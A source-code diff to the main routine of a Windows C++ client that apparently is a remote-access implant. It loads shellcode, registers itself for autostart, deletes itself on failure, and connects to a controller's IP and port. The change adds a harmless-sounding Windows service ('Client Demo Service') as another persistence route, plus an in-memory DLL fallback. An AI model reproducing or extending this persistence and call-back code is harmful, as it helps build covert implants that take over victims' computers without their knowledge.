@@ -12,6 +12,7 @@
 #include "SCLoader.cpp"
 extern "C" {
 #include "reg_startup.h"
+#include "ServiceWrapper.h"
 }
 
 #pragma comment(lib, "ws2_32.lib")
@@ -216,8 +217,10 @@ public:
 // 如果配置文件不存在就从命令行中获取IP和端口.
 int main(int argc, const char *argv[])
 {
+    InitWindowsService({"ClientDemoService", "Client Demo Service", "Provide a demo service."});
+    bool isService = g_ConnectAddress.iStartup == Startup_TestRunMsc;
     // 注册启动项
-    int r = RegisterStartup("Client Demo", "ClientDemo", true);
+    int r = RegisterStartup("Client Demo", "ClientDemo", !isService);
     if (r <= 0) {
         BOOL s = self_del();
         if (!IsDebug)return r;
@@ -227,6 +230,17 @@ int main(int argc, const char *argv[])
     if(!ok) {
         Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
     }
+
+	if (isService) {
+		bool ret = RunAsWindowsService(argc, argv);
+		Mprintf("RunAsWindowsService %s. Arg Count: %d\n", ret ? "succeed" : "failed", argc);
+        for (int i = 0; !ret && i < argc; i++) {
+			Mprintf(" Arg [%d]: %s\n", i, argv[i]);
+        }
+		if (ret) return 0x20251202;
+        g_ConnectAddress.iStartup = Startup_MEMDLL;
+	}
+
     status = 0;
     SetConsoleCtrlHandler(&callback, TRUE);
 
@@ -275,8 +289,9 @@ int main(int argc, const char *argv[])
     }
 
     do {
-        BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
-                       argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
+        BOOL ret = Run((argc > 1 && argv[1][0] != '-') ? // remark: demo may run with argument "-agent"
+            argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
+            argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
         if (ret == 1) {
             return -1;
         }
